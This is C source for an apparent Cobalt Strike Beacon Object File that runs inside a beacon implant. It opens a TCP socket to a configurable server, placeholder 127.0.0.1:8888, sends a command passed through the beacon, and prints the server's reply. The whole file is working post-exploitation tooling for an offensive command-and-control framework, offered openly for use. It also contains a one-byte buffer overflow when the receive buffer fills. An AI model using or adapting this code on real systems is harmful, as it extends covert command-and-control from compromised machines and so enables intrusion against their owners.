//---------------------
//Author: Kleiton Kurti
//Twitter: @kleiton0x7e
//----------------------
//To compile
//x86_64-w64-mingw32-gcc client.c or simply use the makefile
//----------------------

#include <winsock2.h>
#include <stdio.h>
#include <string.h>
#include "beacon.h"

//--- change the values ---
#define MAX_BUFFER_SIZE    1024
#define SERVER_IP          "127.0.0.1"
#define SERVER_PORT        8888
//-------------------------

#pragma comment(lib, "ws2_32.lib")

WINBASEAPI      void         __cdecl   MSVCRT$memset(void *dest, int c, size_t count);
WINBASEAPI      size_t       __cdecl   MSVCRT$strlen(const char *_Str);
DECLSPEC_IMPORT int          __cdecl   MSVCRT$strcmp(const char* _Str1, const char* _Str2);
DECLSPEC_IMPORT int          __stdcall WS2_32$connect(SOCKET sock, const struct sockaddr* name, int namelen);
DECLSPEC_IMPORT int          __stdcall WS2_32$recv(SOCKET s, char *buf, int len, int flags);
DECLSPEC_IMPORT int          __stdcall WS2_32$closesocket(SOCKET sock);
DECLSPEC_IMPORT u_short      __stdcall WS2_32$htons(u_short hostshort);
DECLSPEC_IMPORT unsigned int __stdcall WS2_32$socket(int af, int type, int protocol);
DECLSPEC_IMPORT int          __stdcall WS2_32$WSACleanup();
DECLSPEC_IMPORT unsigned long WSAAPI   WS2_32$inet_addr(const char *cp);
DECLSPEC_IMPORT int           WSAAPI   WS2_32$send(SOCKET s, const char *buf, int len, int flags);
DECLSPEC_IMPORT int           WSAAPI   WS2_32$WSAStartup(WORD wVersionRequired, LPWSADATA lpWSAData);

int go(char * args, int length) {
    datap  parser;
    char * command;
    
    BeaconDataParse(&parser, args, length);
    command = BeaconDataExtract(&parser, NULL);

    WSADATA wsaData;
    SOCKET clientSocket;
    struct sockaddr_in serverAddress;
    char buffer[MAX_BUFFER_SIZE];
    int totalBytesSent = 0, bytesSent;

    // Initialize Winsock
    if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to initialize winsock.\n");
        return 1;
    }

    // Create socket
    clientSocket = WS2_32$socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to create socket.\n");
        WS2_32$WSACleanup();
        return 1;
    }

    // Set server address and port
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = WS2_32$inet_addr(SERVER_IP);
    serverAddress.sin_port = WS2_32$htons(SERVER_PORT);

    // Connect to the server
    if (WS2_32$connect(clientSocket, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) < 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to connect to the server.\n");
        WS2_32$closesocket(clientSocket);
        WS2_32$WSACleanup();
        return 1;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Connected to server.\n");


    // Remove newline character from the command
    int commandLength = MSVCRT$strlen(command);
    if (commandLength > 0 && command[commandLength - 1] == '\n') {
	    command[commandLength - 1] = '\0';
    }

    // Check if the user wants to exit
    if (MSVCRT$strcmp(command, "exit") == 0) {
        return EXIT_FAILURE;
    }

	BeaconPrintf(CALLBACK_OUTPUT, "Sending command: %s\n", command);

	// Send command to the server
	while (totalBytesSent < commandLength + 1) {
	    bytesSent = WS2_32$send(clientSocket, command + totalBytesSent, commandLength + 1 - totalBytesSent, 0);
	    if (bytesSent == SOCKET_ERROR) {
		BeaconPrintf(CALLBACK_OUTPUT, "Failed to send command to the server.\n");
		WS2_32$closesocket(clientSocket);
		WS2_32$WSACleanup();
		return 1;
	    }

	    totalBytesSent += bytesSent;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "Command sent. Waiting for response...\n");

	// Receive response from the server
	int totalBytesRead = 0;
	while (1) {
	    int bytesRead = WS2_32$recv(clientSocket, buffer + totalBytesRead, MAX_BUFFER_SIZE - totalBytesRead, 0);
	    if (bytesRead <= 0) {
		    // Error or connection closed
		    break;
	    }

	    totalBytesRead += bytesRead;

	    // Check if the entire message has been received
	    if (buffer[totalBytesRead - 1] == '\0') {
		    break;
	    }
	}

	buffer[totalBytesRead] = '\0'; // Null-terminate the received data

	BeaconPrintf(CALLBACK_OUTPUT, "Received response from server: %s\n", buffer);

	// Reset variables for next command
	totalBytesSent = 0;

	// Clear the buffer
	MSVCRT$memset(buffer, 0, sizeof(buffer));

	// Close the client socket
	WS2_32$closesocket(clientSocket);
	WS2_32$WSACleanup();

    return 0;
}
